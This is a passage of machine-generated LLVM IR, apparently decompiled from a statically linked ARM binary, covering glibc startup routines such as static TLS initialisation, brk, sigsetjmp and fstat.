bb:                                               ; preds = %dec_label_pc_14890
  %v2_148dc = add i32 %v3_14894, -1
  br label %dec_label_pc_14904

dec_label_pc_14900:                               ; preds = %dec_label_pc_14890, %dec_label_pc_14a34
  %v0_14914.pre = phi i32 [ %v0_14914.pre.pre, %dec_label_pc_14a34 ], [ ptrtoint (i32* @global_var_23104.179 to i32), %dec_label_pc_14890 ]
  %v1_14904.pre = phi i32 [ %v1_14904.pre.pre, %dec_label_pc_14a34 ], [ %v0_14868, %dec_label_pc_14890 ]
  %v1_1492825 = phi i32 [ %v0_14a3c, %dec_label_pc_14a34 ], [ %v0_1486c.v3_14894, %dec_label_pc_14890 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_14a34 ], [ %v3_14890, %dec_label_pc_14890 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_14a34 ], [ %v3_1489c, %dec_label_pc_14890 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_14a34 ], [ %v3_148a0, %dec_label_pc_14890 ]
  br label %dec_label_pc_14904

dec_label_pc_14904:                               ; preds = %bb, %dec_label_pc_14900
  %storemerge80 = phi i32 [ %v2_148dc, %bb ], [ 0, %dec_label_pc_14900 ]
  %v0_14904 = phi i32 [ %v2_148dc, %bb ], [ 0, %dec_label_pc_14900 ]
  %storemerge = phi i32 [ %v3_14894, %bb ], [ 1, %dec_label_pc_14900 ]
  %storemerge79 = phi i32 [ %v3_14894, %bb ], [ 1, %dec_label_pc_14900 ]
  %v0_14914 = phi i32 [ ptrtoint (i32* @global_var_23104.179 to i32), %bb ], [ %v0_14914.pre, %dec_label_pc_14900 ]
  %v1_14904 = phi i32 [ %v0_14868, %bb ], [ %v1_14904.pre, %dec_label_pc_14900 ]
  %v1_14928 = phi i32 [ %v0_1486c.v3_14894, %bb ], [ %v1_1492825, %dec_label_pc_14900 ]
  %stack_var_-52.3 = phi i32 [ %v3_14890, %bb ], [ %stack_var_-52.0, %dec_label_pc_14900 ]
  %stack_var_-48.3 = phi i32 [ %v3_1489c, %bb ], [ %stack_var_-48.0, %dec_label_pc_14900 ]
  %stack_var_-44.3 = phi i32 [ %v3_148a0, %bb ], [ %stack_var_-44.0, %dec_label_pc_14900 ]
  store i32 %storemerge80, i32* %r0.global-to-local, align 4
  store i32 %storemerge79, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_14904 = add i32 %v1_14904, %v0_14904
  %v2_14908 = udiv i32 %v2_14904, %storemerge
  store i32 %v2_14908, i32* %r0.global-to-local, align 4
  %v2_1490c = mul i32 %v2_14908, %storemerge
  store i32 %v2_1490c, i32* %sb.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_14914 = add i32 %v0_14914, 80
  %v3_14914 = inttoptr i32 %v2_14914 to i32*
  %v4_14914 = load i32, i32* %v3_14914, align 4
  store i32 %v4_14914, i32* %r3.global-to-local, align 4
  %v1_14918 = inttoptr i32 %v4_14914 to i32*
  %v2_14918 = load i32, i32* %v1_14918, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v1_14920 = add i32 %v1_14928, 1168
  %v2_14924 = add i32 %v1_14920, %stack_var_-52.3
  %v2_14928 = add i32 %v2_14924, %v2_1490c
  %v2_1492c = add i32 %v2_14928, %v2_14918
  store i32 %v2_1492c, i32* %r0.global-to-local, align 4
  %v1_14930 = call i32 @__GI_sbrk(i32 %v2_1492c)
  %v1_14934 = load i32, i32* %fp.global-to-local, align 4
  %v1_1493c = sub i32 0, %v1_14934
  store i32 11976, i32* %r4.global-to-local, align 4
  %v2_14934 = add i32 %v1_14930, 1167
  %v1_14944 = add i32 %v2_14934, %v1_14934
  %v2_14948 = and i32 %v1_14944, %v1_1493c
  store i32 %v2_14948, i32* @r5, align 4
  %v1_14950 = load i32, i32* %sl.global-to-local, align 4
  %v3_14950 = add i32 %v1_14950, 11976
  %v4_14950 = inttoptr i32 %v3_14950 to i32*
  store i32 62, i32* %v4_14950, align 4
  %v0_14958 = load i32, i32* @r5, align 4
  %v1_14958 = load i32, i32* %sb.global-to-local, align 4
  %v2_14958 = add i32 %v1_14958, %v0_14958
  store i32 %v2_14958, i32* @ip, align 4
  %v0_1495c = load i32, i32* %sl.global-to-local, align 4
  %v1_1495c = load i32, i32* %r4.global-to-local, align 4
  %v2_1495c = add i32 %v1_1495c, %v0_1495c
  store i32 %v2_1495c, i32* %r4.global-to-local, align 4
  %v2_14960 = add i32 %v0_1495c, 13264
  store i32 %v2_14960, i32* %r8.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  store i32 %stack_var_-44.3, i32* @r1, align 4
  store i32 %stack_var_-48.3, i32* @r2, align 4
  store i32 %v2_14958, i32* @r0, align 4
  %v2_14974 = add i32 %v2_1495c, 16
  %v3_14974 = inttoptr i32 %v2_14974 to i32*
  store i32 %v2_14958, i32* %v3_14974, align 4
  %v0_14978 = load i32, i32* %sb.global-to-local, align 4
  %v1_14978 = load i32, i32* %r8.global-to-local, align 4
  %v2_14978 = add i32 %v1_14978, 40
  %v3_14978 = inttoptr i32 %v2_14978 to i32*
  store i32 %v0_14978, i32* %v3_14978, align 4
  %v0_1497c = load i32, i32* @r3, align 4
  %v1_1497c = trunc i32 %v0_1497c to i8
  %v2_1497c = load i32, i32* %r4.global-to-local, align 4
  %v3_1497c = add i32 %v2_1497c, 20
  %v4_1497c = inttoptr i32 %v3_1497c to i8*
  store i8 %v1_1497c, i8* %v4_1497c, align 1
  %v0_14980 = load i32, i32* %r4.global-to-local, align 4
  %v1_14980 = add i32 %v0_14980, 8
  store i32 %v1_14980, i32* @r4, align 4
  %v0_14984 = call i32 @memcpy()
  %v0_1498c = load i32, i32* @r4, align 4
  %v1_1498c = load i32, i32* @r5, align 4
  %v2_1498c = inttoptr i32 %v1_1498c to i32*
  store i32 %v0_1498c, i32* %v2_1498c, align 4
  %v0_14990 = load i32, i32* @r5, align 4
  store i32 %v0_14990, i32* %r0.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_14990, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_f634.463 to i32))
  store i32 92, i32* %r3.global-to-local, align 4
  %v0_149a4 = load i32, i32* %sl.global-to-local, align 4
  %v2_149a4 = add i32 %v0_149a4, 92
  %v3_149a4 = inttoptr i32 %v2_149a4 to i32*
  %v4_149a4 = load i32, i32* %v3_149a4, align 4
  store i32 %v4_149a4, i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 12488, i32* %r1.global-to-local, align 4
  %v2_149b0 = add i32 %v0_149a4, 64
  %v3_149b0 = inttoptr i32 %v2_149b0 to i32*
  %v4_149b0 = load i32, i32* %v3_149b0, align 4
  store i32 %v4_149b0, i32* %r0.global-to-local, align 4
  %v3_149b8 = add i32 %v0_149a4, 12488
  %v4_149b8 = inttoptr i32 %v3_149b8 to i32*
  store i32 64, i32* %v4_149b8, align 4
  %v1_149c0 = load i32, i32* %r8.global-to-local, align 4
  %v2_149c0 = add i32 %v1_149c0, 20
  %v3_149c0 = inttoptr i32 %v2_149c0 to i32*
  store i32 %stack_var_-44.3, i32* %v3_149c0, align 4
  %v1_149c8 = load i32, i32* %r8.global-to-local, align 4
  %v2_149c8 = add i32 %v1_149c8, 24
  %v3_149c8 = inttoptr i32 %v2_149c8 to i32*
  store i32 %stack_var_-48.3, i32* %v3_149c8, align 4
  %v1_149d0 = load i32, i32* %r0.global-to-local, align 4
  %v2_149d0 = inttoptr i32 %v1_149d0 to i32*
  store i32 1, i32* %v2_149d0, align 4
  %v1_149d8 = load i32, i32* %r8.global-to-local, align 4
  %v2_149d8 = add i32 %v1_149d8, 28
  %v3_149d8 = inttoptr i32 %v2_149d8 to i32*
  store i32 %stack_var_-52.3, i32* %v3_149d8, align 4
  %v0_149e0 = load i32, i32* @r6, align 4
  %v2_149e0 = icmp eq i32 %v0_149e0, 0
  %v1_149e4 = load i32, i32* %r8.global-to-local, align 4
  %v2_149e4 = add i32 %v1_149e4, 44
  %v3_149e4 = inttoptr i32 %v2_149e4 to i32*
  store i32 1, i32* %v3_149e4, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v0_149ec = load i32, i32* %sl.global-to-local, align 4
  %v1_149ec = load i32, i32* %r1.global-to-local, align 4
  %v2_149ec = add i32 %v1_149ec, %v0_149ec
  store i32 %v2_149ec, i32* %r2.global-to-local, align 4
  %v1_149f0 = load i32, i32* @r6, align 4
  br i1 %v2_149e0, label %.thread33, label %bb52

.thread33:                                        ; preds = %dec_label_pc_14904
  store i32 %v1_149f0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_149fc34 = load i32, i32* %r8.global-to-local, align 4
  %v2_149fc35 = add i32 %v1_149fc34, 32
  %v3_149fc36 = inttoptr i32 %v2_149fc35 to i32*
  store i32 %v1_149f0, i32* %v3_149fc36, align 4
  br label %bb53

bb52:                                             ; preds = %dec_label_pc_14904
  %v2_149f4 = add i32 %v1_149f0, -1
  store i32 %v2_149f4, i32* %r0.global-to-local, align 4
  %v1_149fc = load i32, i32* %r8.global-to-local, align 4
  %v2_149fc = add i32 %v1_149fc, 32
  %v3_149fc = inttoptr i32 %v2_149fc to i32*
  store i32 %v1_149f0, i32* %v3_149fc, align 4
  %v1_14a00 = load i32, i32* @r6, align 4
  store i32 %v1_14a00, i32* %r1.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %.thread33, %bb52
  %v0_14a04 = load i32, i32* %r8.global-to-local, align 4
  %v1_14a04 = load i32, i32* %r2.global-to-local, align 4
  %v2_14a04 = add i32 %v1_14a04, 28
  %v3_14a04 = inttoptr i32 %v2_14a04 to i32*
  store i32 %v0_14a04, i32* %v3_14a04, align 4
  %v0_14a08 = load i32, i32* %r2.global-to-local, align 4
  %v1_14a08 = load i32, i32* %ip.global-to-local, align 4
  %v2_14a08 = inttoptr i32 %v1_14a08 to i32*
  store i32 %v0_14a08, i32* %v2_14a08, align 4
  %v0_14a0c = load i32, i32* %r0.global-to-local, align 4
  %v1_14a0c = load i32, i32* %r3.global-to-local, align 4
  %v2_14a0c = add i32 %v1_14a0c, %v0_14a0c
  store i32 %v2_14a0c, i32* %r0.global-to-local, align 4
  %v1_14a10 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v2_149e0, label %bb54, label %._crit_edge

._crit_edge:                                      ; preds = %bb53
  %v0_14a18.pre = load i32, i32* @r6, align 4
  br label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %._crit_edge, %bb54
  %v0_14a18 = phi i32 [ %v0_14a18.pre, %._crit_edge ], [ %v1_14a10, %bb54 ]
  %v2_14a14 = udiv i32 %v2_14a0c, %v1_14a10
  %v2_14a18 = load i32, i32* %sb.global-to-local, align 4
  %v3_14a18 = mul i32 %v2_14a14, %v0_14a18
  %v4_14a18 = add i32 %v2_14a18, %v3_14a18
  store i32 %v4_14a18, i32* @r0, align 4
  %v0_14a1c = load i32, i32* %fp.global-to-local, align 4
  %v2_14a1c = icmp ult i32 %v0_14a1c, 16
  %v0_14a1c. = select i1 %v2_14a1c, i32 16, i32 %v0_14a1c
  store i32 %v0_14a1c., i32* @r1, align 4
  %v2_14a2c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_14a2c, i32* @r4, align 4
  store i32 %v6_14848, i32* @r5, align 4
  store i32 %v15_14848, i32* %r8.global-to-local, align 4
  store i32 %v18_14848, i32* %sb.global-to-local, align 4
  store i32 %v21_14848, i32* %sl.global-to-local, align 4
  store i32 %v24_14848, i32* %fp.global-to-local, align 4
  store i32 %v27_14848, i32* @lr, align 4
  %v0_14a30 = call i32 @init_static_tls()
  store i32 %v0_14a30, i32* %r0.global-to-local, align 4
  %v0_14a3c.pre = load i32, i32* @ip, align 4
  %v1_14904.pre.pre.pre = load i32, i32* @r5, align 4
  %v0_14914.pre.pre.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_14a34

dec_label_pc_148c0.dec_label_pc_14a34.loopexit_crit_edge: ; preds = %dec_label_pc_148bc
  br label %dec_label_pc_14a34.loopexit

dec_label_pc_14a34.loopexit:                      ; preds = %dec_label_pc_148c0.dec_label_pc_14a34.loopexit_crit_edge, %dec_label_pc_14874
  br label %dec_label_pc_14a34

dec_label_pc_14a34:                               ; preds = %dec_label_pc_14a34.loopexit, %entry, %bb55
  %v0_14914.pre.pre = phi i32 [ ptrtoint (i32* @global_var_23104.179 to i32), %dec_label_pc_14a34.loopexit ], [ ptrtoint (i32* @global_var_23104.179 to i32), %entry ], [ %v0_14914.pre.pre.pre, %bb55 ]
  %v1_14904.pre.pre = phi i32 [ %v0_14868, %dec_label_pc_14a34.loopexit ], [ %v0_14868, %entry ], [ %v1_14904.pre.pre.pre, %bb55 ]
  %v0_14a3c = phi i32 [ %v0_1486c, %dec_label_pc_14a34.loopexit ], [ %v0_1486c, %entry ], [ %v0_14a3c.pre, %bb55 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v0_14a3c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_14900

; uselistorder directives
  uselistorder i32 %v0_14a3c, { 1, 0 }
  uselistorder i32 %v1_149f0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1495c, { 1, 0 }
  uselistorder i32 %v2_14958, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_148bc, { 2, 1, 0 }
  uselistorder i32 %v3_14894, { 1, 0, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_1489c66, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_148c0, { 1, 0 }
  uselistorder i32 %v0_1486c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_14868, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1485c, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 10, 11, 0, 13, 14, 15 }
  uselistorder i32* %r1.global-to-local, { 5, 4, 6, 7, 8, 0, 10, 9, 3, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 7, 6, 8, 9, 10, 11, 12, 1, 0, 2, 3 }
  uselistorder i32 ()* @init_static_tls, { 1, 0 }
  uselistorder i32 12488, { 0, 2, 1 }
  uselistorder i32 -4096, { 0, 1, 3, 2, 5, 4, 6 }
  uselistorder i32 (i32)* @__GI_sbrk, { 0, 3, 2, 1, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_14a34, { 0, 2, 1 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_14904, { 1, 0 }
  uselistorder label %dec_label_pc_14900, { 1, 0 }
  uselistorder label %dec_label_pc_14884, { 1, 0 }
}

define i32 @function_14a54(i64* %arg1) local_unnamed_addr {
dec_label_pc_14a54:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_14a54 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14a54, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_14a54
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_14a54, %bb
  %v7_14a74 = phi i32 [ %tmp, %dec_label_pc_14a54 ], [ 0, %bb ]
  ret i32 %v7_14a74

; uselistorder directives
  uselistorder label %.thread7, { 1, 0 }
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v2_14a80 = call i32 @__libc_setup_tls(i32 8, i32 16)
  ret i32 %v2_14a80
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r2.global-to-local, align 4
  %v4_14a90 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 164) to i32*), align 4
  %v4_14a98 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 112) to i32*), align 4
  store i32 %v4_14a98, i32* %r1.global-to-local, align 4
  %v1_14a9c = add i32 %arg1, 44
  %v2_14a9c = inttoptr i32 %v1_14a9c to i32*
  %v3_14a9c = load i32, i32* %v2_14a9c, align 4
  %v1_14aa0 = add i32 %arg1, 28
  %v2_14aa0 = inttoptr i32 %v1_14aa0 to i32*
  %v3_14aa0 = load i32, i32* %v2_14aa0, align 4
  store i32 %v3_14aa0, i32* %r2.global-to-local, align 4
  %v2_14aa4 = inttoptr i32 %v4_14a90 to i32*
  store i32 %v3_14a9c, i32* %v2_14aa4, align 4
  %v0_14aa8 = load i32, i32* %r2.global-to-local, align 4
  %v1_14aa8 = load i32, i32* %r1.global-to-local, align 4
  %v2_14aa8 = inttoptr i32 %v1_14aa8 to i32*
  store i32 %v0_14aa8, i32* %v2_14aa8, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 112, { 2, 3, 4, 6, 0, 7, 5, 1, 8 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 164) to i32*), { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_14ab4(i32 %arg1) local_unnamed_addr {
dec_label_pc_14ab4:
  %v0_14ab4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14ab4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14ab4
  %v2_14ab4 = load i32, i32* @r4, align 4
  %v5_14ab4 = udiv i32 %v2_14ab4, 2
  %v6_14ab4 = and i32 %v5_14ab4, %arg1
  %v5_14ab8 = sub nsw i32 32, %v6_14ab4
  %v6_14ab8 = shl i32 %v6_14ab4, %v5_14ab8
  %v9_14ab8 = and i32 %v6_14ab8, %v6_14ab4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14ab4, %bb
  %v10_14ab8 = phi i32 [ %arg1, %dec_label_pc_14ab4 ], [ %v9_14ab8, %bb ]
  ret i32 %v10_14ab8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v1_14ac4 = add i32 %arg1, 40
  store i32 %v1_14ac4, i32* %r2.global-to-local, align 4
  %v1_14ac8 = inttoptr i32 %v1_14ac4 to i32*
  %v2_14ac8 = load i32, i32* %v1_14ac8, align 4
  store i32 %v2_14ac8, i32* %r2.global-to-local, align 4
  %v3_14ac8 = add i32 %arg1, 44
  %v4_14ac8 = inttoptr i32 %v3_14ac8 to i32*
  %v5_14ac8 = load i32, i32* %v4_14ac8, align 4
  store i32 %v5_14ac8, i32* %r3.global-to-local, align 4
  %v0_14acc = call i32 @__aeabi_read_tp()
  %v1_14ad0 = inttoptr i32 %v0_14acc to i32*
  %v2_14ad0 = load i32, i32* %v1_14ad0, align 4
  store i32 %v2_14ad0, i32* %r1.global-to-local, align 4
  %v3_14ad4 = mul i32 %v5_14ac8, 8
  store i32 %v3_14ad4, i32* %r3.global-to-local, align 4
  %v1_14ad8 = load i32, i32* %r2.global-to-local, align 4
  %v2_14ad8 = add i32 %v1_14ad8, %v0_14acc
  %v3_14adc = add i32 %v3_14ad4, %v2_14ad0
  %v4_14adc = inttoptr i32 %v3_14adc to i32*
  store i32 %v2_14ad8, i32* %v4_14adc, align 4
  %v0_14ae0 = load i32, i32* %r3.global-to-local, align 4
  %v1_14ae0 = load i32, i32* %r1.global-to-local, align 4
  %v2_14ae0 = add i32 %v1_14ae0, %v0_14ae0
  store i32 %v2_14ae0, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v4_14ae8 = add i32 %v2_14ae0, 4
  %v5_14ae8 = inttoptr i32 %v4_14ae8 to i8*
  store i8 1, i8* %v5_14ae8, align 1
  %v0_14aec = load i32, i32* @r4, align 4
  %v1_14aec = add i32 %v0_14aec, 20
  store i32 %v1_14aec, i32* %r1.global-to-local, align 4
  %v1_14af0 = inttoptr i32 %v1_14aec to i32*
  %v2_14af0 = load i32, i32* %v1_14af0, align 4
  store i32 %v2_14af0, i32* @r1, align 4
  %v3_14af0 = add i32 %v0_14aec, 24
  %v4_14af0 = inttoptr i32 %v3_14af0 to i32*
  %v5_14af0 = load i32, i32* %v4_14af0, align 4
  store i32 %v5_14af0, i32* %r2.global-to-local, align 4
  %v5_14af4 = call i32 @__GI_mempcpy(i32 %v2_14ad8, i32 %v2_14af0, i32 %v5_14af0, i32 1)
  %v0_14af8 = load i32, i32* @r4, align 4
  %v1_14af8 = add i32 %v0_14af8, 28
  store i32 %v1_14af8, i32* %r3.global-to-local, align 4
  %v1_14afc = inttoptr i32 %v1_14af8 to i32*
  %v2_14afc = load i32, i32* %v1_14afc, align 4
  store i32 %v2_14afc, i32* %r2.global-to-local, align 4
  %v3_14afc = add i32 %v0_14af8, 24
  %v4_14afc = inttoptr i32 %v3_14afc to i32*
  %v5_14afc = load i32, i32* %v4_14afc, align 4
  store i32 %v5_14afc, i32* %r3.global-to-local, align 4
  %v2_14b00 = sub i32 %v5_14afc, %v2_14afc
  store i32 %v2_14b00, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_14b08 = inttoptr i32 %v5_14af4 to i8*
  %v4_14b08 = call i32 @__GI_memset(i8* %v3_14b08, i32 0, i32 %v2_14b00)
  ret i32 %v4_14b08

; uselistorder directives
  uselistorder i32 %v3_14ad4, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_mempcpy, { 1, 0 }
  uselistorder i8 1, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_14b58:
  store i32 13316, i32* @r3, align 4
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 13316) to i32*), align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 13316, { 1, 0, 2, 3 }
}

define i32 @__sigsetjmp() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v0_14b6c = load i32, i32* @r0, align 4
  %v1_14b70 = inttoptr i32 %v0_14b6c to i32*
  %v2_14b70 = load i32, i32* @r4, align 4
  store i32 %v2_14b70, i32* %v1_14b70, align 4
  %v3_14b70 = add i32 %v0_14b6c, 4
  %v4_14b70 = inttoptr i32 %v3_14b70 to i32*
  %v5_14b70 = load i32, i32* @r5, align 4
  store i32 %v5_14b70, i32* %v4_14b70, align 4
  %v6_14b70 = add i32 %v0_14b6c, 8
  %v7_14b70 = inttoptr i32 %v6_14b70 to i32*
  %v8_14b70 = load i32, i32* @r6, align 4
  store i32 %v8_14b70, i32* %v7_14b70, align 4
  %v9_14b70 = add i32 %v0_14b6c, 12
  %v10_14b70 = inttoptr i32 %v9_14b70 to i32*
  %v11_14b70 = load i32, i32* @r7, align 4
  store i32 %v11_14b70, i32* %v10_14b70, align 4
  %v12_14b70 = add i32 %v0_14b6c, 16
  %v13_14b70 = inttoptr i32 %v12_14b70 to i32*
  %v14_14b70 = load i32, i32* @r8, align 4
  store i32 %v14_14b70, i32* %v13_14b70, align 4
  %v15_14b70 = add i32 %v0_14b6c, 20
  %v16_14b70 = inttoptr i32 %v15_14b70 to i32*
  %v17_14b70 = load i32, i32* @sb, align 4
  store i32 %v17_14b70, i32* %v16_14b70, align 4
  %v18_14b70 = add i32 %v0_14b6c, 24
  %v19_14b70 = inttoptr i32 %v18_14b70 to i32*
  %v20_14b70 = load i32, i32* @sl, align 4
  store i32 %v20_14b70, i32* %v19_14b70, align 4
  %v21_14b70 = add i32 %v0_14b6c, 28
  %v22_14b70 = inttoptr i32 %v21_14b70 to i32*
  %v23_14b70 = load i32, i32* @fp, align 4
  store i32 %v23_14b70, i32* %v22_14b70, align 4
  %v24_14b70 = add i32 %v0_14b6c, 32
  %v25_14b70 = inttoptr i32 %v24_14b70 to i32*
  %v27_14b70 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_14b70, i32* %v25_14b70, align 4
  %v28_14b70 = add i32 %v0_14b6c, 36
  %v29_14b70 = inttoptr i32 %v28_14b70 to i32*
  %v30_14b70 = load i32, i32* @lr, align 4
  store i32 %v30_14b70, i32* %v29_14b70, align 4
  %v0_14b74 = call i32 @__sigjmp_save()
  ret i32 %v0_14b74

; uselistorder directives
  uselistorder i32 %v0_14b6c, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_14b80 = load i32, i32* @r1, align 4
  store i32 %v0_14b80, i32* @r3, align 4
  store i32 197, i32* %r7.global-to-local, align 4
  %v0_14b90 = load i32, i32* @r0, align 4
  store i32 %v0_14b90, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_14b90, -4095
  br i1 %tmp, label %dec_label_pc_14bb8, label %dec_label_pc_14b9c

dec_label_pc_14b9c:                               ; preds = %entry
  %v0_14ba0 = call i32 @__aeabi_read_tp()
  %v3_14ba4 = load i16, i16* @global_var_23164.175, align 2
  %v4_14ba4 = sext i16 %v3_14ba4 to i32
  store i32 %v4_14ba4, i32* @r3, align 4
  %v0_14ba8 = load i32, i32* @r2, align 4
  %v1_14ba8 = sub i32 0, %v0_14ba8
  store i32 %v1_14ba8, i32* @r2, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_14bb0 = add i32 %v4_14ba4, %v0_14ba0
  %v4_14bb0 = inttoptr i32 %v3_14bb0 to i32*
  store i32 %v1_14ba8, i32* %v4_14bb0, align 4
  br label %dec_label_pc_14bc8

dec_label_pc_14bb8:                               ; preds = %entry
  store i32 %v0_14b90, i32* %r7.global-to-local, align 4
  %v2_14bb8 = icmp eq i32 %v0_14b90, 0
  br i1 %v2_14bb8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14bb8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14bb8, %bb
  call void @__pseudo_cond_branch(i1 %v2_14bb8, i32 ptrtoint (i32* @global_var_14ca8.601 to i32))
  br label %dec_label_pc_14bc8

dec_label_pc_14bc8:                               ; preds = %dec_label_pc_14b9c, %.thread
  %v0_14bc8 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_14bc8

; uselistorder directives
  uselistorder i32 %v0_14b90, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_14bc8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_14bdc = load i32, i32* @r4, align 4
  store i32 %v3_14bdc, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r2.global-to-local, align 4
  %v3_14bf4 = inttoptr i32 %arg2 to i8*
  %v4_14bf4 = call i32 @__GI_memset(i8* %v3_14bf4, i32 0, i32 104)
  %v2_14bf8 = load i32, i32* %arg1, align 4
  store i32 %v2_14bf8, i32* %r3.global-to-local, align 4
  %v3_14bf8 = add i32 %tmp, 4
  %v4_14bf8 = inttoptr i32 %v3_14bf8 to i32*
  %v5_14bf8 = load i32, i32* %v4_14bf8, align 4
  store i32 %v5_14bf8, i32* %r4.global-to-local, align 4
  %v0_14bfc = load i32, i32* %r5.global-to-local, align 4
  %v1_14bfc = inttoptr i32 %v0_14bfc to i32*
  store i32 %v2_14bf8, i32* %v1_14bfc, align 4
  %v3_14bfc = add i32 %v0_14bfc, 4
  %v4_14bfc = inttoptr i32 %v3_14bfc to i32*
  %v5_14bfc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14bfc, i32* %v4_14bfc, align 4
  %v0_14c00 = load i32, i32* %r6.global-to-local, align 4
  %v1_14c00 = add i32 %v0_14c00, 12
  %v2_14c00 = inttoptr i32 %v1_14c00 to i32*
  %v3_14c00 = load i32, i32* %v2_14c00, align 4
  %v1_14c04 = load i32, i32* %r5.global-to-local, align 4
  %v2_14c04 = add i32 %v1_14c04, 12
  %v3_14c04 = inttoptr i32 %v2_14c04 to i32*
  store i32 %v3_14c00, i32* %v3_14c04, align 4
  %v0_14c08 = load i32, i32* %r6.global-to-local, align 4
  %v1_14c08 = add i32 %v0_14c08, 96
  store i32 %v1_14c08, i32* %r3.global-to-local, align 4
  %v1_14c0c = inttoptr i32 %v1_14c08 to i32*
  %v2_14c0c = load i32, i32* %v1_14c0c, align 4
